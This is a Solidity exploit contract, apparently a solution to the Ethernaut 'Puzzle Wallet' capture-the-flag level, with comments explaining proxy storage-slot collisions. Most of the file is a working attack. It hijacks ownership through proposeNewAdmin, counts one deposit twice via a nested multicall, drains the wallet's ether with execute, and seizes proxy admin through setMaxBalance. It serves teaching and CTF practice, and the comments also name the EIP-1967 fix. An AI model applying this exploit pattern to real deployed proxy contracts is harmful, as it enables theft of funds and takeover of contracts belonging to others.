// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../contracts/PuzzleWallet.sol';

/* Explanation

    First thing that I need to know is that proxies share the storage slots with the logic contract
    Lets check this, call the pendingAdmin variable inside the proxy
    -await contract.call({ data: web3.eth.abi.encodeFunctionSignature("pendingAdmin()") });
    And then call the owner variable inside the logic contract
    -await contract.owner()

    Surprise! They're the same.
    As I say, proxies contracts and logic contracts share the storage slot

    How is this problem fix in real life?
    Starting the implementation slot of the proxy in a semi-random place, far away from the slots of the logic contract
    _IMPLEMENTATION_SLOT == bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1))

    But how was I able to call a function inside the proxy contract?
    Well actually, we're always calling the proxy contract
    The proxy redirect us to the logic contract throw a delegatecall
    This is why both contracts share storage slots

    But, why the console only let me call methods inside the logic contract?
    Certain explorer will let you pair proxy to implementation and show available functions from there
    This is why we call the methods inside the proxy contract at a low level using call or sendTransaction
*/

contract HackPuzzleWallet {

    // Both wallet and proxy use the same address
    PuzzleWallet wallet = PuzzleWallet(0x2c4f402E38c8018Ed285521Bed01B6a748bCCA2B);
    PuzzleProxy proxy = PuzzleProxy(payable(0x2c4f402E38c8018Ed285521Bed01B6a748bCCA2B));

    // We make the function payable in order to pass an amount of ether to the contract
    function hack() public payable {

      /*
        Now, the first slot of the logical contract is owner as well as pendingAdmin of the proxy contract.
        Let's propose a new admin inside the proxy contract in order to override the owner varible of the logic contract
        Congrats! You're the owner of the PuzzleWallet contract
      */
      proxy.proposeNewAdmin(address(this));

      // Now, you need to whitelist your address
      wallet.addToWhitelist(address(this));

      /*
        maxBalance and admin share the same slot of the storage
        We need to set maxBalance variable as our address parsed as a uint
        In order to do so, we need the balance of the contract to be zero
        If we see in etherscan, now the contract balance is 0.001 ether
      */

      /*
        You're going to seize the multicall function inside the PuzzleWallet contract
        The argument data is an Array of bytes that represents functions inside the contract
        The goal of having a multicall function is saving gas calling several functions in one transaction
        There's a bool called depositCalled that acts as a security measure
        This makes imposible to call twice the function deposit inside the contract
        If you could call it twice, you could duplicate your balance and then withdraw the contract balance
        In order to call the function deposit twice, we're going to make a nested call
        Nothing stops you to use one call of the data for the deposit and a second one for a multicall with a nested deposit
        As the bool is set at the start of the multicall, if we call it again it's going to be reseted
      */

      // We define our array of bytes for our nested call and set the length in one
      bytes[] memory nestedCall = new bytes[](1);
      // A function selector is the first four bytes a function definition hashed with keccak256
      // One we have that selector, we need to encode it with encodeWithSelector
      nestedCall[0] = abi.encodeWithSelector(wallet.deposit.selector);

      // we define our array of bytes for our principal call and set the length in two
      bytes[] memory calls = new bytes[](2);
      // The first call it's going to be a deposit
      calls[0] = abi.encodeWithSelector(wallet.deposit.selector);
      // The second call it's going to be a multicall with out nested deposit
      calls[1] = abi.encodeWithSelector(wallet.multicall.selector, nestedCall);
      
      // Once we have our arrays of bytes defined, we call the multicall function with a value of 0.001 ether
      // This way we're going to call deposit twice, with a value of 0.001 each, making our balance of 0.002 ether
      wallet.multicall{value: 0.001 ether}(calls);

      // Because our balance now is 0.002 ether, we can call the execute function
      // As the contract balance is 0.001 ether, we're going to leave the contract without funds
      wallet.execute(tx.origin, 0.002 ether, "");

      // Now that the balance contract is zero, we can set the maxBalance to out parsed address
      // and become the admin of the proxy
      wallet.setMaxBalance(uint256(uint160(tx.origin)));
    }
}
